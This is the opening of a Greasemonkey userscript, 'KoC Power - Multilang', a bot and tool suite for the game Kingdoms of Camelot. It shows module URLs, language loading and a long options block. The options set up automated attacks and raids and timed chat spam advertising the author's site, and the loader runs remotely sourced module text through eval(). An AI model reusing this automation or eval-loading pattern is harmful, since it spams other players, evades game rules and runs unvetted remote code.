// ==UserScript==
// @name           KoC Power - Multilang
// @version        1.3.6f
// @namespace      PDX
// @description    Allround Tool - Kingdom of Camelot - All Lang
// @homepage       http://koc.god-like.org

// @include        *apps.facebook.com/kingdomsofcamelot/*
// @include        *kingdomsofcamelot.com/*main_src.php*
// @include        *kingdomsofcamelot.com/*newgame_src.php*
// @include        *facebook.com/connect/uiserver.php*
// @include        *facebook.com/*/serverfbml*
// @include        *facebook.com/dialog/feed*
// @include        *facebook.com/dialog/stream.publish*
// @include        *facebook.com/dialog/apprequests*
// @include        *kingdomsofcamelot.com/*standAlone.php*
// @include        *kingdomsofcamelot.com/*acceptToken_src.php*
// @include	   	   *kingdomsofcamelot.com/*helpFriend_src.php*
// @include        *kabam.com/kingdoms-of-camelot/play*

// @resource       en http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.en.js
// @resource       de http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.de.js
// @resource       fr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.fr.js
// @resource       it http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.it.js
// @resource       tr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.tr.js
// @resource       gr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.gr.js
// @resource       es http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.es.js
// @resource       pt http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.pt.js
// @resource       SR http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.SR.js
// @resource       IMAGES http://koc-power-pdx.googlecode.com/svn/trunk/img/images.js
// @resource       TABS_SPAM http://koc-power-pdx.googlecode.com/svn/trunk/tabs/spam.js
// @resource       TABS_INVENTORY http://koc-power-pdx.googlecode.com/svn/trunk/tabs/inventory.js
// @resource       TABS_WILD http://koc-power-pdx.googlecode.com/svn/trunk/tabs/wild.js
// @resource       TABS_CREST http://koc-power-pdx.googlecode.com/svn/trunk/tabs/crest.js
// @resource       TABS_ALLIANCE http://koc-power-pdx.googlecode.com/svn/trunk/tabs/alliance.js
// @resource       TABS_KNIGHT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/knight.js
// @resource       TABS_WEBSITE http://koc-power-pdx.googlecode.com/svn/trunk/tabs/website.js
// @resource       TABS_REPORTS http://koc-power-pdx.googlecode.com/svn/trunk/tabs/reports.js
// @resource       TABS_COMBAT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/combat.js
// @resource       TABS_CHAT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/chat.js
// @resource       TABS_AUTOCRAFT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/autocraft.js
// @resource       TABS_FAKE http://koc-power-pdx.googlecode.com/svn/trunk/tabs/fake.js
// @resource       TABS_TOURNAMENT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/tournament.js
// @resource       TABS_RAID http://koc-power-pdx.googlecode.com/svn/trunk/tabs/raid.js
// @resource       TABS_DARKFOREST http://koc-power-pdx.googlecode.com/svn/trunk/tabs/darkforest.js
// @resource       TABS_MAP http://koc-power-pdx.googlecode.com/svn/trunk/tabs/map.js
// @resource       TABS_SEARCH http://koc-power-pdx.googlecode.com/svn/trunk/tabs/search.js
// @resource       TABS_OVERVIEW http://koc-power-pdx.googlecode.com/svn/trunk/tabs/overview.js
// @resource       TABS_BUILD http://koc-power-pdx.googlecode.com/svn/trunk/tabs/build.js
// @resource       TABS_AUTOSCOUT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/autoscout.js
// @resource       TABS_TRAIN http://koc-power-pdx.googlecode.com/svn/trunk/tabs/train.js
// @resource       TABS_PLAYER http://koc-power-pdx.googlecode.com/svn/trunk/tabs/player.js
// @resource       TABS_GIFT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/gift.js
// @resource       TABS_TRANSPORT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/transport.js
// @resource       TABS_ACTIONLOG http://koc-power-pdx.googlecode.com/svn/trunk/tabs/actionlog.js
// @resource       TABS_THRONE http://koc-power-pdx.googlecode.com/svn/trunk/tabs/throne.js
// @resource       TABS_MOVEMENT http://koc-power-pdx.googlecode.com/svn/trunk/tabs/movement.js
// @resource       PLUGIN_BUTTLER http://koc-power-pdx.googlecode.com/svn/trunk/plugins/buttler.js
// @resource       PLUGIN_RPTHOTLINK http://koc-power-pdx.googlecode.com/svn/trunk/plugins/reporthotlink.js
// @resource       PLUGIN_RPTDELETE http://koc-power-pdx.googlecode.com/svn/trunk/plugins/reportdelete.js
// @resource       PLUGIN_ALLIANCEBATTLERPT http://koc-power-pdx.googlecode.com/svn/trunk/plugins/alliancebattlerpt.js
// @resource       PLUGIN_FOODALERT http://koc-power-pdx.googlecode.com/svn/trunk/plugins/foodalert.js
// @resource       PLUGIN_GOLDCOLLECTOR http://koc-power-pdx.googlecode.com/svn/trunk/plugins/goldcollector.js
// @resource       PLUGIN_FAIRIEKILLER http://koc-power-pdx.googlecode.com/svn/trunk/plugins/fairiekiller.js
// @resource       PLUGIN_RPTBATTLE http://koc-power-pdx.googlecode.com/svn/trunk/plugins/rptbattle.js
// @resource       PLUGIN_TABMANAGER http://koc-power-pdx.googlecode.com/svn/trunk/plugins/tabmanager.js
// @resource       PLUGIN_ALLIANCECOUNT http://koc-power-pdx.googlecode.com/svn/trunk/plugins/alliancecountdown.js
// @resource       PLUGIN_DEBUGWIN http://koc-power-pdx.googlecode.com/svn/trunk/plugins/debug.js
// @resource       PLUGIN_EXPORTKOCATTACK http://koc-power-pdx.googlecode.com/svn/trunk/plugins/exportkocattack.js

// @icon           http://koc.god-like.org/power/img/kocscripts.png
// ==/UserScript==
/************************************************************************************
*						KOC POWER - VERSION 										*
************************************************************************************/
// KoC Power - Multilang {name, id, version, url}
var kocpower = 'KoC Power - Multilang';
var pdxScriptID = '104137';
var Version = '1.3.6f';
var userscriptURL = 'http://userscripts.org/scripts/show/104137';
// KoC Power Bot {pdx, kocscripters}
var BOTUVersion = '1.1.9';
var KoCScriptersBot = '20120209a'; 
// KoC Power Tools {pdx, kocscripters}
var TOOLSUVersion = '20110721a-german';
var KoCScriptersTools = '20111211a';
// Langpack Version
var LangVersion= '0.5.1 - 05/02/2012';
// JSON
//var JSON;if(!JSON){JSON={};}(function(){"use strict";function f(n){return n<10?'0'+n:n;}if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+'-'+f(this.getUTCMonth()+1)+'-'+f(this.getUTCDate())+'T'+f(this.getUTCHours())+':'+f(this.getUTCMinutes())+':'+f(this.getUTCSeconds())+'Z':null;};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}if(typeof rep==='function'){value=rep.call(holder,key,value);}switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}v=partial.length===0?'[]':gap?'[\n'+gap+partial.join(',\n'+gap)+'\n'+mind+']':'['+partial.join(',')+']';gap=mind;return v;}if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}if(typeof JSON.stringify!=='function'){JSON.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}return str('',{'':value});};}if(typeof JSON.parse!=='function'){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}return reviver.call(holder,key,value);}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}throw new SyntaxError('JSON.parse');};}}());
var JSON;if(!JSON){JSON={}}(function(){function str(a,b){var c,d,e,f,g=gap,h,i=b[a];if(i&&typeof i==="object"&&typeof i.toJSON==="function"){i=i.toJSON(a)}if(typeof rep==="function"){i=rep.call(b,a,i)}switch(typeof i){case"string":return quote(i);case"number":return isFinite(i)?String(i):"null";case"boolean":case"null":return String(i);case"object":if(!i){return"null"}gap+=indent;h=[];if(Object.prototype.toString.apply(i)==="[object Array]"){f=i.length;for(c=0;c<f;c+=1){h[c]=str(c,i)||"null"}e=h.length===0?"[]":gap?"[\n"+gap+h.join(",\n"+gap)+"\n"+g+"]":"["+h.join(",")+"]";gap=g;return e}if(rep&&typeof rep==="object"){f=rep.length;for(c=0;c<f;c+=1){if(typeof rep[c]==="string"){d=rep[c];e=str(d,i);if(e){h.push(quote(d)+(gap?": ":":")+e)}}}}else{for(d in i){if(Object.prototype.hasOwnProperty.call(i,d)){e=str(d,i);if(e){h.push(quote(d)+(gap?": ":":")+e)}}}}e=h.length===0?"{}":gap?"{\n"+gap+h.join(",\n"+gap)+"\n"+g+"}":"{"+h.join(",")+"}";gap=g;return e}}function quote(a){escapable.lastIndex=0;return escapable.test(a)?'"'+a.replace(escapable,function(a){var b=meta[a];return typeof b==="string"?b:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+a+'"'}function f(a){return a<10?"0"+a:a}"use strict";if(typeof Date.prototype.toJSON!=="function"){Date.prototype.toJSON=function(a){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(a){return this.valueOf()}}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;if(typeof JSON.stringify!=="function"){JSON.stringify=function(a,b,c){var d;gap="";indent="";if(typeof c==="number"){for(d=0;d<c;d+=1){indent+=" "}}else if(typeof c==="string"){indent=c}rep=b;if(b&&typeof b!=="function"&&(typeof b!=="object"||typeof b.length!=="number")){throw new Error("JSON.stringify")}return str("",{"":a})}}if(typeof JSON.parse!=="function"){JSON.parse=function(text,reviver){function walk(a,b){var c,d,e=a[b];if(e&&typeof e==="object"){for(c in e){if(Object.prototype.hasOwnProperty.call(e,c)){d=walk(e,c);if(d!==undefined){e[c]=d}else{delete e[c]}}}}return reviver.call(a,b,e)}var j;text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))){j=eval("("+text+")");return typeof reviver==="function"?walk({"":j},""):j}throw new SyntaxError("JSON.parse")}}})()
var JSON2 = JSON;
/************************************************************************************
*						KOC POWER - LANGSTUFF 										*
************************************************************************************/
eval(GM_getResourceText( 'IMAGES' ));
var LangOptions = {	culang : 'en',	langpacks : new Object(),};
readLangOptions();
var culang;
if (!langpack) { var langpack = new Object() };
langpack.loaded = false;
eval(GM_getResourceText( LangOptions.culang ));
culang = langpack;
culang.doTranslate=function(text){
	// Replaces alle placeholders in text with corresponding values from culang
	// {%key%}  == culang.key
	
	var pattern=/{%([a-z0-9_$]+)%}/gi;
	var keys=Array();
	while (result = pattern.exec(text)) {
		var key=result[1];
		//GM_log(key);
		var found=false; for(var i=0;i<keys.length;i++){if(keys[i]==key){found=true;break;}}
		if(found) continue;
		keys.push(key);
	}
	var s=text;
	for(var i=0;i<keys.length;i++){
		var key=keys[i];
		if(typeof(culang[key])=="undefined") {
			GM_log("WARNING: Missing translation! 'culang."+key+"' Language: '"+LangOptions.culang+"'");
			continue;
		}
		var exp=new RegExp("{%"+key+"%}","g");
		s=s.replace(exp,culang[key])
	} return s; }
/****************************************************************************
* 		multi language string resources (kocpdx.SR.js) 						*
****************************************************************************/
if(document.body.id == 'mainbody'){
	var SR={languages:["en","de","fr","it","tr","es","se","nl"]};
	for(var iSL=0;iSL<SR.languages.length;iSL++){SR[SR.languages[iSL]]={};}
	SR.getArray=function (entryKey, defLang){
		var tkArray=new Array();
		var tkLangArray2=[defLang].concat(SR.languages);
		for(var tkL=0;tkL<tkLangArray2.length;tkL++){
			var tkLang=tkLangArray2[tkL];
			if(typeof(SR[tkLang])==="undefined") continue;
			for(var tkX=1;;tkX++){
				if(typeof(SR[tkLang][entryKey+"_"+tkX])==="undefined") break;
				tkEntry=SR[tkLang][entryKey+"_"+tkX];
				tkExist=false;
				for(var tkAi=0;tkAi<tkArray.length;tkAi++){
					if(tkArray[tkAi]===tkEntry){tkExist=true;break;}
				}
				if(tkExist) continue;
				tkArray.push(tkEntry);
			}
		} return tkArray; 
		};
	try{eval(GM_getResourceText('SR'));SR.loaded=true;}
	catch(ex){
		GM_log("ERROR: loading kocpdx.SR.js"+"\n"+ex);
		srErrDiv=document.createElement("div");
		srErrDiv.innerHTML="ERROR loading kocpdx.SR.js!";
		srErrDiv.setAttribute("style","background:yellow");
		document.body.insertBefore(srErrDiv, document.body.firstChild);
	}
	GM_log("String resources loaded: "+(SR.loaded==true));
	
	// define 'en' fallback
	for (var srEntry in SR.en){
		if(srEntry.match(/_[0-9]+$/)) continue; // skip "array" entries "item_1,item_2"
		// GM_log("SR.en."+srEntry+"="+"'"+SR.de[srEntry]+"';");
		if(typeof(SR.de[srEntry])==="undefined")SR.de[srEntry]=SR.en[srEntry];
		if(typeof(SR.fr[srEntry])==="undefined")SR.fr[srEntry]=SR.en[srEntry];
		if(typeof(SR.it[srEntry])==="undefined")SR.it[srEntry]=SR.en[srEntry];
		if(typeof(SR.tr[srEntry])==="undefined")SR.tr[srEntry]=SR.en[srEntry];
		if(typeof(SR.es[srEntry])==="undefined")SR.es[srEntry]=SR.en[srEntry];
		if(typeof(SR.se[srEntry])==="undefined")SR.se[srEntry]=SR.en[srEntry];
		if(typeof(SR.nl[srEntry])==="undefined")SR.nl[srEntry]=SR.en[srEntry];
	}
}
//#endregion multi language string resources (kocpdx.SR.js) 
/************************************************************************************
*						KOC POWER - OPTIONS											*
************************************************************************************/
var Options = {
	enablePDXMenu : true,	Smiley : true,	widescreen   : true, enableTrainingQue : true,
	hideKoCBar : false,		hideKoCHeader : false,		hideFriends : false,		hideShowKoCBottomStuff : false,
	pdxBannerBar : true,		pdxInfoBox : true,
	IconSize : '15',		TrTroopIconSize : '20',   	ResIconSize : '22',		showStatsStyle : 'inset',		showStatsHeadlines : 'pdxStatLine', 	OverViewFontSize : 10, 
	includeWachturm : true, 	includeTrainTroopIcon : true,		includeIcons : true,		includeResIcons : true,		includeReseachBuildTimes : false,		includeMaersche : true,		includeRessis : true,		includeNahrung : true,	includeNahrungUnten : false,		includeTruppen : true,	includeInfos : false,		includeCity  : true,		includeMarching:true,		includeTraining:false,
	encRemaining : true,	maxIdlePop   : true, attackCityPicker : true,	mapCoordsTop : true,	dispBattleRounds : true,	reportDeleteButton : true,
	showMightKoCBugFix : true, showResKoCBugFix : true, fixKnightSelect : true, fixTower     : true,	fixTower2    : true,	fixMapDistance: true,	fixWarnZero  : true,
	chatEnhance : true, enhanceARpts : true,	enhanceViewMembers : true,	allowAlterAR : true,	enableFoodWarn : true,		foodWarnHours : 24,	enableFoodChatWarn : false,		foodChatWarnHours : 4,	hideOnGoto : true,
	chatTop : '-590px',		chatLeft : '725px',		chatHoeheL : '800px',	widewidth : '1220px', chatWidth : 340,
	srcSortBy    : 'level',		srcdisttype  : 'square',		srcAll       : true,		srcMinLevel  : 3,		srcMaxLevel  : 3,		wildType     : 1,		srcScoutAmt  : 1,		minmight     : 1,
	unownedOnly  : true,		mistedOnly   : false,		hostileOnly  : false,		friendlyOnly : false,		alliedOnly   : false,		unalliedOnly : false,		neutralOnly  : false,
	pbWinIsOpen  : true,	pbWinDrag    : true,	pbWinPos     : {},	pbTrackOpen  : true,	pbKillFairie : true,	pbGoldHappy  : 75,	pbGoldEnable : false,	pbEveryEnable: false,	pbEveryMins  : 30,	pbChatOnRight: true,	pbWideMap    : true,
	alertConfig  : {aChat:true, aPrefix:culang.inctrp, scouting:true, wilds:true,  defend:true, minTroops:1, spamLimit:10, lastAttack:0, raidautoswitch: {}, },
	alertSound   : {enabled:false, towerSoundURL:'http://koc.god-like.org/power/sounds/default/sirene.mp3', repeat:true, playLength:20, repeatDelay:0.5, volume:100, alarmActive:false, expireTime:0},
	includeMight       : false,		includeAlliance    : false,		includeCityName    : false,	defendMessage      : culang.defending,	hideMessage        : culang.notrpdef,
	celltext     : {atext:false, provider:0, num1:"000", num2:"000", num3:"0000"},
	spamconfig   : {aspam:false, spamvert:'Hallo Global :)', spammins:'10', atime:2},
	spamconfiga  : {aspama:false, spamverta:'Hey, heute schon auf koc.god-like.org gewesen?', spamminsa:'60', atimea:2},
	giftDomains  : {valid:false, list:{}},
	giftDelete   : 'e',
	currentTab   : null,
	transportinterval : 10,		minwagons    : 100,		maxwagons          : 150000,		wagontype          : 9,		foodunits          : 'Menge',		goldunits          : 'Menge',
	lasttransport: 0,	reassigninterval: 60,		lastreassign : 0,
	HelpRequest  : true,	DeleteRequest: false,	MapShowExtra : false,	RaidRunning  : true,	RaidReset    : 0,	forceMarchUpdate : true,
	DeleteMsg	 : false,		DeleteMsgs0  : false,		DeleteMsgs1  : false,		DeleteMsgs2  : false, DeleteMsgs3  : false, DeleteTimer: 120,
	Foodstatus   : {1:0,2:0,3:0,4:0,5:0,6:0,7:0},
	Creststatus  : {1101:0,1102:0,1103:0,1104:0,1105:0,1106:0,1107:0,1108:0,1109:0,1110:0,1111:0,1112:0,1113:0,1114:0,1115:0},
	LastReport   : 0,	LastCrestReport   : 0,	
	MsgInterval  : 24,	CrestMsgInterval  : 24,
	foodreport   : false,	crestreport  : false,
	Crest1Count  : 0,	Crest2Count  : 0,	CrestLevel   : 0,	CrestType    : 0,
	enableTowerAlert : false,	chatAttack : true, enableTowerAlertWild : false,	enableFoodChatAlert : false,	enableFoodChatAlertBG : false,	chatWildAttack : false,
	AllianceLeaders : [],
	rptType:'alliance',	arAttacker:'both',	arTarget:'both',
	scSeperator2 : true,	scLinebreak : true,		scToolbar : true, 	NeueNachricht : true,		AllianzBerichte : true,		MeineBerichte : true,		Verstaerken : true,	
	Transport : true,		Wiederholen : true,		AutoBau : true,		Neuzuordnen : true,		Makieren : true,		AutoTransport : true, 	AutoNeuzuordnen : true,		Hilfe : true,		AutoRefresh : true,		scRaidReset : true,		scAutoTrain : true,	scCrafting : true,	scCrest : true,		DarkForestButton : true,		scStopSound : true,		scSeperator1 : true,
	arPageFrom : 1,	arPageTo : 3,
	enableNickColor		: false,		userNameSou1	: "Your-CallNickName",
	enableUserName1     : false,		userName1		: "Lord PDX",	enableUserName2     : false,		userName2		: "Lady Darren Fohnstone",	enableUserName3     : false,		userName3		: "Lord Thomas Chapin",	enableUserName4     : false,		userName4		: "Lord George Jetson",	enableUserName5     : false,		userName5		: "Lord niknah",	enableUserName6     : false,		userName6		: "Lord DonDavici",	enableUserName7     : false, userName7	: "Lord Nico De Belder",	enableUserName8     : false,		userName8		: "Lord jontey",	enableUserName9     : false,		userName9		: "Lord Darren Fohnstone",	enableUserName10	: false,		userName10		: "Lord PDX",	enableUserName11     : false,		userName11		: "Lord PDX",	enableUserName12     : false,		userName12		: "Lady Darren Fohnstone",	enableUserName13     : false,		userName13		: "Lord Thomas Chapin",	enableUserName14     : false,		userName14		: "Lord George Jetson",	enableUserName15     : false,		userName15		: "Lord niknah",	enableUserName16     : false,		userName16		: "Lord DonDavici",	enableUserName17     : false, userName17	: "Lord Nico De Belder",	enableUserName18     : false,		userName18		: "Lord jontey",	enableUserName19     : false,		userName19		: "Lord Darren Fohnstone",	enableUserName20	: false,		userName20		: "Lord PDX",	enableUserName21     : false,		userName21		: "Lord PDX",	enableUserName22     : false,		userName22		: "Lady Darren Fohnstone",	enableUserName23     : false,		userName23		: "Lord Thomas Chapin",	enableUserName24     : false,		userName24		: "Lord George Jetson",	enableUserName25     : false,		userName25		: "Lord niknah",	enableUserName26     : false,		userName26		: "Lord DonDavici",	enableUserName27     : false, userName27	: "Lord Nico De Belder",	enableUserName28     : false,		userName28		: "Lord jontey",	enableUserName29     : false,		userName29		: "Lord Darren Fohnstone",	enableUserName30	: false,		userName30		: "Lord PDX",
	sessionRefresh : false,
	AttackUnits : {},	AttackFav : {0:{0:"200K Miliz",1:0,2:200000,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0},1:{0:"200K S-Kav",1:0,2:0,3:0,4:0,5:0,6:0,7:200000,8:0,9:0,10:0,11:0,12:0,13:0},},	AttackHorloge: '21:00:00',		AttackGoHorloge: null,		AttackOnOff : false,		AttackUnits : {},		AttackFromCity : 0,		AttackCibleX : 0,		AttackCibleY : 0,		AttackKnight : 0,
	TournoiLigne : 25,	Xrenfort : 0, Yrenfort : 0,
	soundURL1 : 'http://koc.god-like.org/power/sounds/default/fluestersound.mp3', 	URLson1vol : 100,	soundURL2 : 'http://koc.god-like.org/power/sounds/default/sirene.mp3', 	URLson2vol : 100,	soundURL3 : 'http://koc.god-like.org/power/sounds/default/alarm.mp3', 	URLson3vol : 100,	soundURL4 : 'http://koc.god-like.org/power/sounds/default/skyandsand.mp3', 	URLson4vol : 100,	URLsonUsr1 : 'http://koc.god-like.org/power/sounds/default/alert-def.mp3', 	URLsonUsr1vol : 100,	OSAattack : false,		soundURL5 : 'http://koc.god-like.org/power/sounds/default/war-alarm.mp3',		URLson5vol : 100,	OSAhorn : false,		soundURL6 : 'http://koc.god-like.org/power/sounds/default/hupenchaos.mp3', 	URLson6vol : 100,	OSAgun : false,		soundURL7 : 'http://koc.god-like.org/power/sounds/default/gun.mp3', 	URLson7vol : 100,
	pdxTimeZones : 'gmtTimeZone', pdxTime : true,	pdxLangFlag : true,	pdxBackgroundStyle : 'pdxKoCOld', pdxSoundSourceSever : 'kocscripts2', pdxSourceSever : 'googlecode',
	ownWP : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/white.jpg', 	ownWPdark : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', // OWN WALLPAPER 
	OwnBackGroundGlobal : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', OwnBackGroundAlliance : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', // ALLIANCE/GLOBAL CHAT BG LIGHT 
	devBG : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', 	pdxQuickInfoBG : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', 	pdxDeskInfoBG : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', // PDX BG
	ChatBGColorGlobal : true,	ChatBGColorAlliance : false,	ChatBGImageGlobal : false,	ChatBGImageAlliance : true,
	enableCheckTournoi: true, CheckTournamentNow: true,
	UserAvatar : false, UserAvatarURL : "http://koc.god-like.org/power/avatar/pdx-useravatar.png",
};
// 	currentTab : false, AttackFSUnits : {1:{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0},2:{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0},3:{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0},4:{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0}},
var Colors ={ // COLORS
    Headers : "#357",
	DarkRow : "#eee",
	ButtonSelected : "#444444",
    MainTitle  : "#333",
	MainTitleSch : "#FFFFFF",
	OptShadow : "4",
	OptShadowCol : "#141516",
    ChatLeader: "#B8B8B8",
    OverviewDarkRow : "#f0f0f0",
	ChatAngriff : "#FF4D4D",
	TabHinPop : "#302110",
	MainPop : "#302110",
	TabTrans :"0.9",
	PopUpWidth :"745",
	StatsU : "#CCCCFF",
	MainBody : "#FFFFFF",
	MainBodyDark : "#141516",
    ChatFontColor : "#FFF", modCommForumA : "#FFF",	modCommForumADark : "#141516",	modCommForumAhover : "#FF0000",	SayToAlliCol : "#CCC",	SayToGlobalCol : "#FF0000",	ChatLinkColGlobal : "#FFF",	ChatLinkColAlly : "#FFF",	ChatLinkContentColor : "#FFF",	ChatLordName : "#FFFFFF", ChatTimeCol  : "#FFFFFF",	ChatTimeHover  : "#CCC",
	scToolbarBG : "none", 	scToolbarBG2 : "none", WhisperBG : "#ffde75",	WildAttack : "#994411",	userBGUsrSou1 : "#584631",	SpamBackground : "#CCCCFF", lowFoodBG : "#FF4D4D", userBG1 : "#333333",	userBG2 : "#584631",	userBG3 : "#FF0000",	userBG4 : "#CCCCFF",	userBG5 : "#CCCCFF",	userBG6 : "#CCCCFF",	userBG7 : "#CCCCFF",	userBG8 : "#CCCCFF",	userBG9 : "#CCCCFF",	userBG10 : "#CCCCFF",	userBG11 : "#333333",	userBG12 : "#584631",	userBG13 : "#FF0000",	userBG14 : "#CCCCFF",	userBG15 : "#CCCCFF",	userBG16 : "#CCCCFF",	userBG17 : "#CCCCFF",	userBG18 : "#CCCCFF",	userBG19 : "#CCCCFF",	userBG20 : "#CCCCFF",	userBG21 : "#333333",	userBG22 : "#584631",	userBG23 : "#FF0000",	userBG24 : "#CCCCFF",	userBG25 : "#CCCCFF",	userBG26 : "#CCCCFF",	userBG27 : "#CCCCFF",	userBG28 : "#CCCCFF",	userBG29 : "#CCCCFF",	userBG30 : "#CCCCFF",
	styleRows : "#999999",
	Tourn : "#FF0000",
	WideScreenWidth :"2800",
	devCreditsFontCol : "#FFF",	devLinkCol : "#FFF",	devLinkColhover : "#FF0000",	pdxQuickInfoFont : "#FFF",	pdxQuickInfoData : "#FF0000",	pdxDeskInfoFont : "#FFF",
	OwnBackgroundColorGlobal : '#141516',	OwnBackgroundColorAlliance : '#141516',
};
var StyleOptions = { // STYLE STUFF
	toStats : '1', 	toHeiligtum : '2', 	toBau :  '3', 	toAusbildung :  '4', 	toKaserne :  '5', 	toTransport :  '6', 	toTruppen :  '7', 	toMovement :  '8', 	toSuchen :  '9', 	toSpieler :  '10', 	toRitter :  '11',		toWildnisse : '12', 	toFarmen : '14', 	toMarsch : '15', toAutoScout : "16", toWappen : '17', 	toDarkForest : '18', 	toGeschenke : '19', 	toRessis : '20',		toMitteilung : '21',		toAllianz : '22', 	toSpam : '23', 	toInfo : '24', 	toAlliancePage : '25', 	toWebsitePage : '26',	toKoCdunno : '27',	toUsr : '28',	toGCode : '29', 	toWiKien : '30',	toWiKide : '31',	toImo : '32',	toCalc : '33',	toChat : '34',	toTurnier : '35',	toInventar : '36',	toFake : '37',	toCombat : '38', toCrafting : '39',	toThrone : '40', toEinstellung : '41',	toLog : '42',	toxChange : '43',
